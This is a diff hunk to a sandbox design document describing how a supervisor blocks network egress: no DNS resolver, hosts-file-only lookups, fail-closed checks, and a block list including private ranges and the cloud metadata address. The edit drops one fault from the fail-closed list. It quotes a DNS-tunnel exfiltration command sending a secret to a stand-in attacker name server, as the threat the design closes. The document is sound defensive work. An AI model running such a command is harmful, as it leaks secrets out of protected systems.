@@ -1008,7 +1008,7 @@ The supervisor also renders an `/etc/resolv.conf` naming no server. Both are bou
 
 That closes the DNS-tunnel exfiltration channel (`dig $secret.attacker-ns.com @resolver`) by the *absence* of any resolver. An undeclared host misses `/etc/hosts` and fails **fast at resolution**, with no 30-second hang.
 
-**Fail-closed and IPv4 only.** Four faults each refuse the run, and the refusal names its reason. The faults are an unresolved name, a name that resolves to IPv6 alone, a set over 256 addresses and any netlink failure.
+**Fail-closed and IPv4 only.** Three faults each refuse the run, and the refusal names its reason. The faults are an unresolved name, a name that resolves to IPv6 alone and any netlink failure.
 
 A host from the fleet's `network.allow` that resolves to any address `af_core::net::is_blocked` refuses also refuses the run. Those addresses are loopback, the private ranges and the tailnet's shared range `100.64.0.0/10`. They also include link-local with the cloud metadata service `169.254.169.254`, and everything reserved.
 
